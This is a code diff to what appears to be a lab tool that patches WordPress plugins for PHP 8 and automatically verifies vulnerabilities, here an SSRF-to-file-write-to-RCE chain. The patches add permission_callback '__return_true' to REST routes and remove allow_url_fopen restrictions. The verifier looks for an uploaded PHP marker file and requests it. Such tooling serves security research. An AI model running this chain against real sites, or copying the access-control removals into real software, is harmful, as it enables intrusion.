@@ -1430,7 +1430,28 @@ class _Lab:
         # calling instance methods as static (safe when method ignores $this).
         # We scan for the opening brace and walk braces to extract the full body.
         _PUB_FUNC_RE = re.compile(
-            r'\bpublic\s+(function\s+\w+\s*\([^)]*\))\s*\{'
+            r'\bpublic\s+(function\s+(\w+)\s*\([^)]*\))\s*\{'
+        )
+        # Magic methods must NEVER be made static (crashes `new Foo()` and serialization).
+        _PHP_MAGIC_METHODS = frozenset({
+            "__construct", "__destruct", "__clone", "__wakeup", "__sleep",
+            "__get", "__set", "__isset", "__unset", "__call", "__callStatic",
+            "__invoke", "__toString", "__serialize", "__unserialize",
+            "__debugInfo", "__set_state",
+        })
+
+        # PHP 8.0 hard-removed create_function().  Replace with an anonymous function.
+        # Only handles the common single-quoted / double-quoted literal form; dynamic
+        # expressions are left as-is (they're rare and hard to transform safely).
+        _CREATE_FUNC_RE = re.compile(
+            r'create_function\s*\(\s*([\'"])(.*?)\1\s*,\s*([\'"])(.*?)\3\s*\)',
+            re.DOTALL,
+        )
+
+        # Strip ini_set('allow_url_fopen', 0) calls — plugins that disable this prevent
+        # the lab verifier from using file_get_contents() to fetch the payload URL.
+        _ALLOW_URL_FOPEN_DISABLE_RE = re.compile(
+            r'ini_set\s*\(\s*[\'"]allow_url_fopen[\'"]\s*,\s*[\'"]?0[\'"]?\s*\)\s*;?',
         )
 
         # REST route: add permission_callback => '__return_true' when missing (required
@@ -1462,11 +1483,14 @@ class _Lab:
             # 2a) PHP 8 callee-side: make `public function` → `public static function`
             #     when the method body has no $this reference.  This handles classes with
             #     private constructors (singletons) where caller-side `new Foo()` would fail.
+            #     Magic methods are excluded — making __construct static crashes new Foo().
             def _make_method_static(text: str) -> str:
                 result = []
                 pos = 0
                 for m in _PUB_FUNC_RE.finditer(text):
-                    # find the opening brace (the one right after the match)
+                    method_name = m.group(2)
+                    if method_name in _PHP_MAGIC_METHODS:
+                        continue
                     brace_pos = m.end() - 1   # the '{' is at m.end()-1
                     depth = 1
                     i = brace_pos + 1
@@ -1478,39 +1502,38 @@ class _Lab:
                         i += 1
                     body = text[brace_pos + 1 : i - 1]
                     if '$this' not in body:
-                        # Replace 'public function' with 'public static function'
                         result.append(text[pos:m.start()])
                         result.append('public static ' + m.group(1) + ' {')
                         pos = m.end()
-                    # else: leave as-is, pos unchanged
                 if pos == 0:
                     return text
                 result.append(text[pos:])
                 return ''.join(result)
             patched = _make_method_static(patched)
+            # 2b) PHP 8.0 hard-removed create_function() — replace with anonymous function.
+            def _replace_create_function(m):
+                args_str = m.group(2)
+                body_str = m.group(4)
+                return f'function({args_str}) {{ {body_str} }}'
+            patched = _CREATE_FUNC_RE.sub(_replace_create_function, patched)
+            # 2c) Remove ini_set('allow_url_fopen', 0) — plugins that disable this prevent
+            #     file_get_contents() from fetching the payload URL in the isolated lab.
+            patched = _ALLOW_URL_FOPEN_DISABLE_RE.sub('', patched)
             # 3) add missing permission_callback to register_rest_route arrays
             def _add_perm_cb(m):
                 block = m.group(0)
                 if "permission_callback" in block:
                     return block
-                # Find the last ) in the matched block (closes the array arg)
                 idx = block.rfind(")")
                 if idx == -1:
                     return block
                 body = block[:idx]
-                # Avoid double-comma: strip trailing comma+whitespace before inserting
                 body_stripped = body.rstrip()
                 sep = "" if body_stripped.endswith(",") else ","
                 return body_stripped + sep + "\n    'permission_callback' => '__return_true'\n)"
             patched = _MISSING_PERM_CB_RE.sub(_add_perm_cb, patched)
             # 4) URL-fetch-and-save: add $_FILES multipart fallback so the lab verifier
             #    can pass content directly without needing an outbound-reachable URL.
-            #    Pattern: $content = file_get_contents($_POST["url_param"])
-            #    Becomes:  $content = !empty($_FILES["file_name"]["tmp_name"])
-            #                ? file_get_contents($_FILES["file_name"]["tmp_name"])
-            #                : (!empty($_FILES["file"]["tmp_name"])
-            #                    ? file_get_contents($_FILES["file"]["tmp_name"])
-            #                    : file_get_contents($_POST["url_param"]))
             def _add_files_fallback(m):
                 var, url_key = m.group(2), m.group(3)
                 return (
@@ -1521,6 +1544,19 @@ class _Lab:
                     f' : file_get_contents($_POST["{url_key}"]))'
                 )
             patched = _URL_FETCH_SAVE_RE.sub(_add_files_fallback, patched)
+            # 5) Cap outbound HTTP timeout to 1s to prevent call-home blocking in isolated lab.
+            #    Many plugins call wp_remote_get/post in register_activation_hook or plugins_loaded;
+            #    each call blocks for the WP default 5s when the target server is unreachable.
+            #    Applied only to the main plugin file, identified by a 'Plugin Name:' docblock.
+            if (('* Plugin Name:' in patched or '* Plugin Name :' in patched)
+                    and 'wp_remote_' in patched
+                    and "add_filter('http_request_timeout'" not in patched):
+                _php_open = patched.find('<?php')
+                if _php_open != -1:
+                    _nl = patched.find('\n', _php_open)
+                    if _nl != -1:
+                        _tf = "\nadd_filter('http_request_timeout',function(){return 1;},PHP_INT_MAX);\n"
+                        patched = patched[:_nl + 1] + _tf + patched[_nl + 1:]
             return patched.encode("utf-8", errors="replace") if patched != text else src_bytes
 
         with tarfile.open(fileobj=buf, mode="w") as tf:
@@ -8813,7 +8849,42 @@ def verify_wordpress_fetch_and_write_rce(
                     caption_en=(f"SSRF→FILE WRITE→RCE: server fetched PHP from listener "
                                  f"and wrote to {dest_path}; marker '{marker}' confirmed."))
             else:
-                step(f"fichero PHP no ejecutado (HTTP {r2.status_code}): {r2.text[:100]!r}")
+                step(f"fichero PHP no ejecutado en ruta directa (HTTP {r2.status_code}): {r2.text[:80]!r}")
+                # Fallback: some plugins save to a date-based subdirectory (YYYY/MM/) or
+                # a plugin-specific subdir — search the full uploads tree for the marker file.
+                found_path = lab.find_in_webroot(marker[:12])
+                if found_path:
+                    # Derive the public URL from the absolute container path
+                    rel = found_path.replace("/var/www/html/", "", 1)
+                    public_url = f"{base}/{rel}"
+                    step(f"fichero encontrado en ruta alternativa: {rel} — probando ejecucion...")
+                    try:
+                        r2b = _req.get(public_url, timeout=15, verify=False)
+                        if marker in r2b.text:
+                            res.verified = True
+                            res.detail = (f"SSRF→file write→RCE confirmado: fichero escrito en "
+                                          f"{rel} (ruta alternativa); marcador '{marker}' ejecutado.")
+                            res.evidence = {
+                                "url_param": url_p, "dest_param": dest_p or "missed",
+                                "dest_path": found_path, "marker": marker,
+                                "source_url": req_params[url_p],
+                                "respuesta_cuerpo_recorte": r2b.text[:200],
+                                "status_code_respuesta": str(r2b.status_code),
+                                "tecnica": "ssrf-fetch-write-rce",
+                                "metodo": m,
+                                "endpoint": endpoint or "/wp-admin/admin-ajax.php",
+                            }
+                            step(f"VERIFICADO (ruta alternativa): {res.detail}")
+                            _capture_exploit_shot(
+                                boot, m, endpoint or "/wp-admin/admin-ajax.php", r,
+                                highlight=marker,
+                                caption_es=(f"SSRF→FILE WRITE→RCE (ruta alternativa {rel}): "
+                                             f"marcador '{marker}' confirmado."),
+                                caption_en=(f"SSRF→FILE WRITE→RCE (alt path {rel}): "
+                                             f"marker '{marker}' confirmed."))
+                            return res
+                    except _req.RequestException:
+                        pass
                 # Check if file was at least written (even if not executed)
                 r3 = _req.get(f"{base}/wp-content/uploads/{marker}.php",
                                    timeout=10, verify=False, stream=True)
@@ -8827,7 +8898,6 @@ def verify_wordpress_fetch_and_write_rce(
                 else:
                     res.detail = ("fichero PHP no encontrado o no ejecutado tras la peticion al endpoint. "
                                    "El endpoint puede requerir auth, nonce, o el parametro de ruta no es 'missed'.")
-                    # Check SSRF listener log at least
                     ssrf_log = lab.listener_log()
                     if marker in ssrf_log:
                         res.detail += f" (SSRF confirmado: el listener recibio la peticion con el token {marker})"
